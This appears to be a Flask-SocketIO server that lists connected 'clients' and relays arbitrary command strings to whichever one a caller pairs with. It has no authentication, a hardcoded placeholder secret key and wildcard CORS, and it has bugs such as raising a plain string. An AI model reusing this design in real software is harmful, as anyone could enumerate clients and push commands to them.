from utils import generate_id
from app_functions import connect_client, connect_user, get_connected_clients, remove_connected
from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit, join_room, close_room
from flask_cors import CORS

app = Flask(__name__)
app.config['SECRET_KEY']="some-secret"
app.config['DEFAULT_PARSERS'] = [
    'flask.ext.api.parsers.JSONParser',
    'flask.ext.api.parsers.URLEncodedParser',
    'flask.ext.api.parsers.FormParser',
    'flask.ext.api.parsers.MultiPartParser'
]
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*")

@socketio.on("connect")
def connected():
    id = request.sid
    connect_user(id)

@socketio.on("getId")
def get_id():
    id = request.sid
    return id

@socketio.on("isClient")
def is_client(id):
    print("is client")
    connect_client(id)

@socketio.on("connectWithClient")
def connect_with_client(data):
    user_id = request.sid
    room_id = generate_id(7)
    id = data.get("id")
    room_already =data.get("room", None)
    if room_already:
        close_room(room_already)
    join_room(room_id, user_id)
    join_room(room_id, id)
    return room_id

@socketio.on("command")
def on_command(data):
    room_id = data.get("room", None)
    command = data.get("command", None); 
    if room_id and command:
        print(command)
        emit("command", command, to=room_id)
    else:
        raise "No Room available or Command specified"
@socketio.on_error()
def on_error(e):
    emit("error", {'error': e})

@socketio.on("disconnect")
def disconnect_client():
    id = request.sid
    remove_connected(id)

@app.get("/search")
def search_clients():
    connected_clients = get_connected_clients()
    return jsonify(connected_clients)


if __name__ == "__main__":
    socketio.run(app)